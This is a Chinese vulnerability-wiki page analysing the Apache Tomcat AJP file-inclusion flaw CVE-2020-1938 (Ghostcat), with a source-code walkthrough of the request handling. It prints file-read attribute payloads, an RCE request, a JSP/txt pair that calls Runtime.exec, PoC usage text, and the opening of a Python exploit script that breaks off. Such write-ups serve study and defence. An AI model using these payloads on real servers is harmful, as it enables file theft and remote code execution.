<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Tomcat/%EF%BC%88CVE-2020-1938%EF%BC%89Apache%20Tomcat%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>（CVE-2020-1938）Apache Tomcat 文件包含漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\uff08CVE-2020-1938\uff09Apache Tomcat \u6587\u4ef6\u5305\u542b\u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_6" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2020-9484%EF%BC%89Tomcat%20session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2020-9484%EF%BC%89Tomcat%20session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2020-9484）Tomcat session反序列化漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2019-0232%EF%BC%89Tomcat%20rce/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2019-0232%EF%BC%89Tomcat%20rce/" class="btn btn-xs btn-link">
        （CVE-2019-0232）Tomcat rce
      </a>
    </div>
    
  </div>

    

    <h1 id="cve-2020-1938apache-tomcat">（CVE-2020-1938）Apache Tomcat 文件包含漏洞<a class="headerlink" href="#cve-2020-1938apache-tomcat" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>对于处在漏洞影响版本范围内的 Tomcat 而言，若其开启 AJP Connector
且攻击者能够访问 AJP Connector 服务端口的情况下，即存在被 Ghostcat
漏洞利用的风险。</p>
<p>注意 Tomcat AJP Connector 默认配置下即为开启状态，且监听在 0.0.0.0:8009</p>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<ul>
<li>
<p>Apache Tomcat 6</p>
</li>
<li>
<p>Apache Tomcat 7 \&lt; 7.0.100</p>
</li>
<li>
<p>Apache Tomcat 8 \&lt; 8.5.51</p>
</li>
<li>
<p>Apache Tomcat 9 \&lt; 9.0.31</p>
</li>
</ul>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<p>由于 <strong>AJP</strong> 并不是一个 <strong>HTTP</strong> 业务流，走的是 <strong>Socket</strong> ，所以
<strong>tomcat</strong> 前面接收业务流的时候调用的是一个 <strong>Socket</strong> 解析类
<strong>SocketProcessorBase#dorun</strong> 来处理 <strong>ajp</strong> 传入的二进制流。</p>
<p><img alt="" src="../resource/%28CVE-2020-1938%29ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId25.png" /></p>
<p>而后面这部分的数据流实际上都是 <strong>socket</strong> 内部进行流传处理。</p>
<p><img alt="" src="../resource/%28CVE-2020-1938%29ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId26.png" /></p>
<p>这里需要感谢 <strong>tomcat</strong> 优雅的代码风格，可读性真强，和 <strong>socket</strong> 相关的
<strong>service</strong>
就下图里面的这些，所以AJP的业务流自然就落在了<code>org/apache/coyote/ajp/AjpProcessor#service</code>这个方法上面进行处理。</p>
<p><img alt="" src="../resource/%28CVE-2020-1938%29ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId27.png" /></p>
<p>这<code>org/apache/coyote/ajp/AjpProcessor#service</code>这个方法里面就留两个关键部分，其他代码太繁杂了，无关大雅，这里首先<code>this.prepareRequest()</code>方法是针对整个业务流进行预处理。</p>
<div class="codehilite"><pre><span></span><code><span class="nx">Copy</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">clipboard</span><span class="w">    </span><span class="kr">public</span><span class="w"> </span><span class="nx">SocketState</span><span class="w"> </span><span class="nx">service</span><span class="p">(</span><span class="nx">SocketWrapperBase</span><span class="cp">&lt;?</span><span class="o">&gt;</span> <span class="nx">socket</span><span class="p">)</span> <span class="nx">throws</span> <span class="nx">IOException</span> <span class="p">{</span>
      <span class="o">...</span>
        <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="k">this</span><span class="o">.</span><span class="nx">getErrorState</span><span class="p">()</span><span class="o">.</span><span class="nx">isError</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">this</span><span class="o">.</span><span class="nx">endpoint</span><span class="o">.</span><span class="nx">isPaused</span><span class="p">())</span> <span class="p">{</span>
            <span class="k">try</span> <span class="p">{</span>
              <span class="o">...</span>
            <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="o">.</span><span class="nx">getErrorState</span><span class="p">()</span><span class="o">.</span><span class="nx">isIoAllowed</span><span class="p">())</span> <span class="p">{</span>
                <span class="nx">rp</span><span class="o">.</span><span class="nx">setStage</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>

                <span class="k">try</span> <span class="p">{</span>
                    <span class="k">this</span><span class="o">.</span><span class="nx">prepareRequest</span><span class="p">();</span>
                <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Throwable</span> <span class="nx">var12</span><span class="p">)</span> <span class="p">{</span>
                            <span class="o">...</span>
            <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="o">.</span><span class="nx">getErrorState</span><span class="p">()</span><span class="o">.</span><span class="nx">isIoAllowed</span><span class="p">())</span> <span class="p">{</span>
                <span class="k">try</span> <span class="p">{</span>
                    <span class="nx">rp</span><span class="o">.</span><span class="nx">setStage</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
                    <span class="k">this</span><span class="o">.</span><span class="nx">getAdapter</span><span class="p">()</span><span class="o">.</span><span class="nx">service</span><span class="p">(</span><span class="k">this</span><span class="o">.</span><span class="nx">request</span><span class="p">,</span> <span class="k">this</span><span class="o">.</span><span class="nx">response</span><span class="p">);</span>
                <span class="p">}</span> 
              <span class="o">...</span>
    <span class="p">}</span>
</code></pre></div>

<p>跟进 <strong>prepareRequest</strong> 方法，这个方法会进行一个 <strong>while</strong> 为 <strong>true</strong>
的无限循环，根据<code>attributeCode</code>的结果进行选择，命中 <strong>case 10</strong>
核心中有个<code>request.setAttribute(n, v)</code>方法，这个方法会从我们之前设置方法中取值，设置，遍历循环POC中的<code>javax.servlet.include.request_uri</code>，<code>javax.servlet.include.path_info</code>，<code>javax.servlet.include.servlet_path</code>这三个属性对应的值，并且通过PUT方法进行赋值。</p>
<div class="codehilite"><pre><span></span><code><span class="nt">Copy</span><span class="w"> </span><span class="nt">to</span><span class="w"> </span><span class="nt">clipboard</span><span class="w">    </span><span class="nt">private</span><span class="w"> </span><span class="nt">void</span><span class="w"> </span><span class="nt">prepareRequest</span><span class="o">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="err">...</span>
<span class="w">        </span><span class="err">while(true)</span><span class="w"> </span><span class="err">{</span>
<span class="w">            </span><span class="err">byte</span><span class="w"> </span><span class="err">attributeCode</span><span class="p">;</span>
<span class="w">            </span><span class="err">while((attributeCode</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">this.requestHeaderMessage.getByte())</span><span class="w"> </span><span class="err">!=</span><span class="w"> </span><span class="err">-1)</span><span class="w"> </span><span class="err">{</span>
<span class="w">                </span><span class="err">switch(attributeCode)</span><span class="w"> </span><span class="err">{</span>
<span class="w">                </span><span class="err">...</span>
<span class="w">                </span><span class="err">case</span><span class="w"> </span><span class="err">10:</span>
<span class="w">                                        </span><span class="err">...</span>
<span class="w">                    </span><span class="p">}</span><span class="w"> </span><span class="nt">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">                        </span><span class="err">this.request.setAttribute(n,</span><span class="w"> </span><span class="err">v)</span><span class="p">;</span>
<span class="w">                    </span><span class="p">}</span>
<span class="w">                    </span><span class="nt">break</span><span class="o">;</span>
</code></pre></div>

<p><img alt="" src="../resource/%28CVE-2020-1938%29ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId28.png" /></p>
<p>好了，这里知道了在 <strong>prepareRequest</strong>
方法中核心是将三个值动态赋予我们想要的结果，再回到<code>org/apache/coyote/ajp/AjpProcessor#service</code>中，在经过
<strong>prepareRequest</strong>
方法处理之后来到的就是<code>getAdapter().service(this.request, this.response);</code>，这个
<strong>serivce</strong> 就是后续处理 <strong>request</strong> 对象和 <strong>response</strong> 对象了。</p>
<p><img alt="" src="../resource/%28CVE-2020-1938%29ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId29.png" /></p>
<p>在 <strong>org/apache/catalina/connector/CoyoteAdapter#service</strong>
这个类中，主要是设置一些连接的时候一些属性，然后通过 <strong>invoke</strong>
反射方法，根据 <strong>request</strong> 对象和 <strong>response</strong>
对象进入后面的HTTP处理逻辑。</p>
<p><img alt="" src="../resource/%28CVE-2020-1938%29ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId30.png" /></p>
<p><img alt="" src="../resource/%28CVE-2020-1938%29ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId31.png" /></p>
<p>所以又回到了前面的老话，tomcat完善的代码结构，HTTP的逻辑服务处理，自然是落在了
<strong>javax/servlet/http/HttpServlet#service</strong> 当中。</p>
<p><img alt="" src="../resource/%28CVE-2020-1938%29ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId32.png" /></p>
<h3 id="_5">任意文件读取<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
<p>前面是整个 <strong>AJP-&gt;HTTP</strong> 整个过程，继续往下跟入，因为通过 <strong>AJP</strong>
转换之后，进行的是 <strong>HTTP GET</strong> 请求，所以来到的自然是是下图中代码位置。</p>
<p><img alt="" src="../resource/%28CVE-2020-1938%29ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId34.png" /></p>
<p>跟进 <strong>doGet</strong> 自然来到之前安恒通告说的地方。</p>
<p><img alt="" src="../resource/%28CVE-2020-1938%29ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId35.png" /></p>
<p>继续跟入 <strong>serveResource</strong>，首先 <strong>getRelativePath</strong> 从之前传入的
<strong>request</strong> 对象中获取 <strong>path</strong> 。</p>
<p><img alt="" src="../resource/%28CVE-2020-1938%29ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId36.png" /></p>
<p>跟进 <strong>getRelativePath</strong> ，一眼就知道为什么要设置 <strong>request_uri</strong>
、<strong>path_info</strong> 、<strong>servlet_path</strong>
这三个属性了，通过路径的拼接，最后返回的 <strong>servletPath</strong>
为<code>/</code>，容器内部为 <strong>/WEB-INF/web.xml</strong> 的文件内容。</p>
<p><img alt="" src="../resource/%28CVE-2020-1938%29ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId37.png" /></p>
<p>继续回到 <strong>serveResource</strong> 方法中 <strong>getResource</strong> 根据前面的 <strong>path</strong>
也就是 <strong>/WEB-INF/web.xml</strong>
进行资源获取。而这里是没办法<code>../</code>出去的，原因继续往下看。</p>
<p><img alt="" src="../resource/%28CVE-2020-1938%29ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId38.png" /></p>
<p>在 <strong>getResource</strong> 当中有个 <strong>validate</strong> ，这个检查往后走会调用
<strong>normalize</strong> 进行目录遍历的检查，之后就是输出读到的内容了。</p>
<p><img alt="" src="../resource/%28CVE-2020-1938%29ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId39.png" /></p>
<p><img alt="" src="../resource/%28CVE-2020-1938%29ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId40.png" /></p>
<p>由于当前 <strong>AJP</strong> 出不了 <strong>webapps</strong>
目录，但是是可以做到任意目录下读的，比如我需要读 <strong>/example/2.txt</strong>
下的文件，只需要这样配置就好了。</p>
<div class="codehilite"><pre><span></span><code>Copy to clipboard    {&#39;name&#39;:&#39;req_attribute&#39;,&#39;value&#39;:[&#39;javax.servlet.include.request_uri&#39;,&#39;/examples&#39;]},
    {&#39;name&#39;:&#39;req_attribute&#39;,&#39;value&#39;:[&#39;javax.servlet.include.path_info&#39;,2.txt]},
    {&#39;name&#39;:&#39;req_attribute&#39;,&#39;value&#39;:[&#39;javax.servlet.include.servlet_path&#39;,&#39;/&#39;]},
    ])
</code></pre></div>

<p><img alt="" src="../resource/%28CVE-2020-1938%29ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId41.png" /></p>
<p>附上任意文件读取的调用栈</p>
<div class="codehilite"><pre><span></span><code>Copy to clipboardserveResource:839, DefaultServlet (org.apache.catalina.servlets)
doGet:504, DefaultServlet (org.apache.catalina.servlets)
service:634, HttpServlet (javax.servlet.http)
service:484, DefaultServlet (org.apache.catalina.servlets)
service:741, HttpServlet (javax.servlet.http)
internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
doFilter:52, WsFilter (org.apache.tomcat.websocket.server)
internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
invoke:199, StandardWrapperValve (org.apache.catalina.core)
invoke:96, StandardContextValve (org.apache.catalina.core)
invoke:493, AuthenticatorBase (org.apache.catalina.authenticator)
invoke:137, StandardHostValve (org.apache.catalina.core)
invoke:81, ErrorReportValve (org.apache.catalina.valves)
invoke:660, AbstractAccessLogValve (org.apache.catalina.valves)
invoke:87, StandardEngineValve (org.apache.catalina.core)
service:343, CoyoteAdapter (org.apache.catalina.connector)
service:476, AjpProcessor (org.apache.coyote.ajp)
process:66, AbstractProcessorLight (org.apache.coyote)
process:808, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1498, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:49, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1142, ThreadPoolExecutor (java.util.concurrent)
run:617, ThreadPoolExecutor$Worker (java.util.concurrent)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:745, Thread (java.lang)
</code></pre></div>

<h3 id="rce">RCE<a class="headerlink" href="#rce" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><code><span class="n">Copy</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">clipboard</span><span class="s2">&quot;HTTP/1.1&quot;</span><span class="w"> </span><span class="s2">&quot;/1.jsp&quot;</span><span class="w"> </span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="w"> </span><span class="n">localhost</span><span class="w"> </span><span class="n">porto</span><span class="w"> </span><span class="mi">8009</span><span class="w"> </span><span class="bp">false</span><span class="w"> </span><span class="s2">&quot;Cookie:AAAA=BBBB&quot;</span><span class="w"> </span><span class="s2">&quot;javax.servlet.include.request_uri:/&quot;</span><span class="p">,</span><span class="s2">&quot;javax.servlet.include.path_info:1.txt&quot;</span><span class="p">,</span><span class="s2">&quot;javax.servlet.include.servlet_path:/upload/&quot;</span>
</code></pre></div>

<p><code>org/apache/jasper/servlet/JspServlet#service</code>负责处理<code>xxx.jsp</code>访问逻辑，跟进来
<strong>jspUri</strong> 是通过 <strong>servlet_path</strong> 和 <strong>path_info</strong> 拼接而来的。</p>
<p><img alt="" src="../resource/%28CVE-2020-1938%29ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId43.png" /></p>
<p>之后便会进入 <strong>serviceJspFile</strong> 逻辑进行处理。</p>
<p><img alt="" src="../resource/%28CVE-2020-1938%29ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId44.png" /></p>
<p>跟进 <strong>serviceJspFile</strong> 方法，首先先通过 <strong>getResource</strong>
获取上传文件的内容，然后再通过初始化 <strong>wrapper</strong>
对象传入相关参数，然后再调用 <strong>JspServletWrapper#service</strong> 进行解析。</p>
<p><img alt="" src="../resource/%28CVE-2020-1938%29ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId45.png" /></p>
<p>这简单解释一下，<strong>RCE</strong> 的核心需要进入的 <strong>JspServlet</strong> ，我们平常访问
<strong>xxx.jsp</strong> 是进入到 <strong>Jspservlet</strong> ，poc中访问<code>/1.jsp</code>通过 <strong>AJP</strong>
发包的过程中实际上就是我们的Get请求访问<code>www.xxx.com/1.jsp</code>，所以这里自然进入了
<strong>JspServlet</strong> 当中，然后再配合 <strong>getResource</strong> 获取上传的文件内容，调用
<strong>Jsp</strong> 引擎进行解析，自然达到了RCE的效果。</p>
<p>最后附上RCE的调用栈</p>
<div class="codehilite"><pre><span></span><code>Copy to clipboardexec:347, Runtime (java.lang)
_jspService:1, _1_txt (org.apache.jsp)
service:70, HttpJspBase (org.apache.jasper.runtime)
service:741, HttpServlet (javax.servlet.http)
service:476, JspServletWrapper (org.apache.jasper.servlet)
serviceJspFile:386, JspServlet (org.apache.jasper.servlet)
service:330, JspServlet (org.apache.jasper.servlet)
service:741, HttpServlet (javax.servlet.http)
internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
doFilter:52, WsFilter (org.apache.tomcat.websocket.server)
internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
invoke:199, StandardWrapperValve (org.apache.catalina.core)
invoke:96, StandardContextValve (org.apache.catalina.core)
invoke:493, AuthenticatorBase (org.apache.catalina.authenticator)
invoke:137, StandardHostValve (org.apache.catalina.core)
invoke:81, ErrorReportValve (org.apache.catalina.valves)
invoke:660, AbstractAccessLogValve (org.apache.catalina.valves)
invoke:87, StandardEngineValve (org.apache.catalina.core)
service:343, CoyoteAdapter (org.apache.catalina.connector)
service:476, AjpProcessor (org.apache.coyote.ajp)
process:66, AbstractProcessorLight (org.apache.coyote)
process:808, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1498, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:49, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1142, ThreadPoolExecutor (java.util.concurrent)
run:617, ThreadPoolExecutor$Worker (java.util.concurrent)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:745, Thread (java.lang)
</code></pre></div>

<p><strong>后话</strong></p>
<p>我试了一下jsp的文件包含，这个demo下也是可以的，所以实际上RCE就是jsp的文件包含搞的鬼，要先上传一个文件，这个文件路径可被包含，然后读取模版解析，最后RCE。</p>
<div class="codehilite"><pre><span></span><code><span class="x">Copy to clipboard//1.jsp</span>
<span class="cp">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">language</span><span class="o">=</span><span class="s2">&quot;java&quot;</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s2">&quot;java.util.*&quot;</span><span class="w"> </span><span class="n">pageEncoding</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span><span class="w"> </span><span class="cp">%&gt;</span>
<span class="cp">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="kp">include</span><span class="w"> </span><span class="n">file</span><span class="o">=</span><span class="s2">&quot;1.txt&quot;</span><span class="w"> </span><span class="cp">%&gt;</span>

<span class="x">//1.txt</span>
<span class="cp">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="no">Runtime</span><span class="o">.</span><span class="n">getRuntime</span><span class="p">()</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="s2">&quot;open /System/Applications/Calculator.app&quot;</span><span class="p">);</span><span class="cp">%&gt;</span>
</code></pre></div>

<p>另外前面可能有师傅会问为什么是GET，原因是下面这个POC有<code>forwardrequest 2</code>，根据AJP数据包格式<code>第6个字节(02)代表是Get请求</code>。另外在Tomcat中也有相关映射关系，在
<strong>AjpProcessor</strong> 做 <strong>prepareRequest</strong>
处理的时候会根据字节选择相关的请求方式。</p>
<p><img alt="" src="../resource/%28CVE-2020-1938%29ApacheTomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId46.png" /></p>
<h3 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><code><span class="n">(py27)&gt; python .\cve-2020-1938-poc.py -h</span>
<span class="n">usage: cve-2020-1938-poc.py [-h] [-p PORT] [-w WEBAPP] [-f FILE] [-l] target</span>

<span class="n">positional arguments:</span>
<span class="n">  target                Hostname or IP to attack</span>

<span class="n">optional arguments:</span>
<span class="n">  -h, --help            show this help message and exit</span>
<span class="n">  -p PORT, --port PORT  AJP port to attack (default is 8009)</span>
<span class="n">  -w WEBAPP, --webapp WEBAPP</span>
<span class="n">                        Which webapp to attack (default is ROOT</span>
<span class="n">  -f FILE, --file FILE  file path :(WEB-INF/web.xml)</span>
<span class="n">  -l, --lfi             local file include</span>
</code></pre></div>

<h3 id="python27">python2.7<a class="headerlink" href="#python27" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># CNVD-2020-10487  Tomcat-Ajp lfi</span>
<span class="c1"># Based on: https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/</span>
<span class="c1">#</span>
<span class="c1"># Some references:</span>
<span class="c1"># https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">struct</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">argparse</span>


<span class="k">def</span><span class="w"> </span><span class="nf">pack_string</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">s</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&gt;h&quot;</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">l</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&gt;H</span><span class="si">%d</span><span class="s2">sb&quot;</span> <span class="o">%</span> <span class="n">l</span><span class="p">,</span> <span class="n">l</span><span class="p">,</span> <span class="n">s</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span>


<span class="k">def</span><span class="w"> </span><span class="nf">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="n">fmt</span><span class="p">):</span>
    <span class="n">size</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">calcsize</span><span class="p">(</span><span class="n">fmt</span><span class="p">)</span>
    <span class="n">buf</span> <span class="o">=</span> <span class="n">stream</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="n">fmt</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>


<span class="k">def</span><span class="w"> </span><span class="nf">unpack_string</span><span class="p">(</span><span class="n">stream</span><span class="p">):</span>
    <span class="n">size</span><span class="p">,</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="s2">&quot;&gt;h&quot;</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">size</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>  <span class="c1"># null string</span>
        <span class="k">return</span> <span class="kc">None</span>
    <span class="n">res</span><span class="p">,</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="s2">&quot;</span><span class="si">%d</span><span class="s2">s&quot;</span> <span class="o">%</span> <span class="n">size</span><span class="p">)</span>
    <span class="n">stream</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># \0</span>
    <span class="k">return</span> <span class="n">res</span>


<span class="k">class</span><span class="w"> </span><span class="nc">NotFoundException</span><span class="p">(</span><span class="ne">Exception</span><span class="p">):</span>
    <span class="k">pass</span>


<span class="k">class</span><span class="w"> </span><span class="nc">AjpBodyRequest</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="c1"># server == web server, container == servlet</span>
    <span class="n">SERVER_TO_CONTAINER</span><span class="p">,</span> <span class="n">CONTAINER_TO_SERVER</span> <span class="o">=</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">MAX_REQUEST_LENGTH</span> <span class="o">=</span> <span class="mi">8186</span>

    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data_stream</span><span class="p">,</span> <span class="n">data_len</span><span class="p">,</span> <span class="n">data_direction</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">data_stream</span> <span class="o">=</span> <span class="n">data_stream</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">data_len</span> <span class="o">=</span> <span class="n">data_len</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">data_direction</span> <span class="o">=</span> <span class="n">data_direction</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">serialize</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">data_stream</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">AjpBodyRequest</span><span class="o">.</span><span class="n">MAX_REQUEST_LENGTH</span><span class="p">)</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&gt;bbH&quot;</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
